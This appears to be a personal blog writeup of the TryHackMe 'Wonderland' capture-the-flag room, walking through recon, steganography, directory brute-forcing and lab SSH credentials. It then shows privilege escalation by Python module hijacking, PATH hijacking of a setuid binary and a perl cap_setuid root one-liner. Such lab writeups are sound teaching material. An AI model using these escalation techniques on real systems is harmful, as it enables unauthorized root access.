---
layout: default
title : Wonderland - Writeup
---

# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>

_**Nov 10, 2020**_

[Wonderland](https://tryhackme.com/room/wonderland) Writeup

## Recon :

```
bvr0n@kali:~/CTF/THM/Wonderland$ nmap -sC -sV 10.10.252.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 10:28 EST
Nmap scan report for 10.10.252.9
Host is up (0.092s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Recon :

Goin to the web page gets us only a `jpeg` image, let's download it and see what can we do with it :

```
bvr0n@kali:~/CTF/THM/Wonderland$ wget http://10.10.252.9/img/white_rabbit_1.jpg
bvr0n@kali:~/CTF/THM/Wonderland$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
```
Turns out, there is a files hidden inside that says this :

```
follow the r a b b i t
```
Didn't understand at first, but when i brute forced directoris i get the idea :

```bash
bvr0n@kali:~/CTF/THM/Wonderland$ ffuf -c -u http://10.10.252.9/FUZZ -w ~/Documents/Dirbuster/wordlist.txt 

img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1]
```

The files was pointing to a path in the browser :

```
http://10.10.252.9/r/a/b/b/i/t/
```

Once i checked the code source i found a hidden text, hidding alice's SSH creds :

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

## Priv Esc :

After some enumeration, i found out that the `/root/` is accessible by everyone but read permission was not given on the other hand execute permission was present, so we can get the `user.txt`

** Rabbit User :

in Alice home directory we can find a script that basically import the random module.

So, we can create a file named random.py in our current working directory that executes `/bin/bash` This way the python file should be loaded instead of the "real" random module, and in turn give us a shell as the rabbit user.
`random.py` :
```python 
import os

os.system("/bin/bash")
```
```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$
```

** Hatter User :

In `/home/rabbit` we can see a setuid binary, after examining the file, we can see that `date` is getting executed without pecifying an absolute path :

```
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

We can abuse this by exporting our own `$PATH` and providing a fake `date` script that will give us a shell with the user :

```
rabbit@wonderland:/tmp$ cat date 
#!/bin/bash
/bin/bash
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ whoami
hatter
```
Inside his directory we can find his ssh credentials :

```
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

** Root :

After some enumeration, linpeas showed something intresting :

```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Looks like `perl` have this capability `cap_setuid+ep` and that we can abuse, [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) :

```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# whoami; id
root
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

<br>
best regards

[bvr0n](https://github.com/bvr0n)


<br>
[back to main()](bvr0n.github.io/)

<br>
